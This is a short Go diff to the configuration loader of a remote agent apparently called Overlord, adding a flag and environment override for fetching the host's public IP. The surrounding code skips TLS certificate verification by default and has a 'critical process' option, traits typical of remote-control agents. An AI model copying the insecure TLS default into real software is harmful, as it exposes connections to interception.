@@ -32,6 +32,7 @@ var DefaultAgentToken = ""
 var DefaultBuildTag = ""
 var DefaultSleepSeconds = "0"
 var DefaultCriticalProcess = "false"
+var DefaultFetchPublicIP = "false"
 
 const settingsFile = "config/settings.json"
 const serverIndexFile = "config/server_index.json"
@@ -72,6 +73,7 @@ type Config struct {
 	AgentToken            string
 	BuildTag              string
 	SleepSeconds          int
+	FetchPublicIP         bool
 }
 
 func Load() Config {
@@ -169,6 +171,11 @@ func Load() Config {
 
 	criticalProcess := strings.ToLower(DefaultCriticalProcess) == "true"
 
+	fetchPublicIP := isTruthy(DefaultFetchPublicIP)
+	if v := strings.TrimSpace(os.Getenv("OVERLORD_FETCH_PUBLIC_IP")); v != "" {
+		fetchPublicIP = isTruthy(v)
+	}
+
 	tlsInsecureSkipVerify := true
 	if v := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_TLS_INSECURE_SKIP_VERIFY"))); v != "" {
 		tlsInsecureSkipVerify = v == "true" || v == "1" || v == "yes"
@@ -215,6 +222,7 @@ func Load() Config {
 		AgentToken:            agentToken,
 		BuildTag:              strings.TrimSpace(DefaultBuildTag),
 		SleepSeconds:          parseSleepSeconds(DefaultSleepSeconds),
+		FetchPublicIP:         fetchPublicIP,
 	}
 }
 
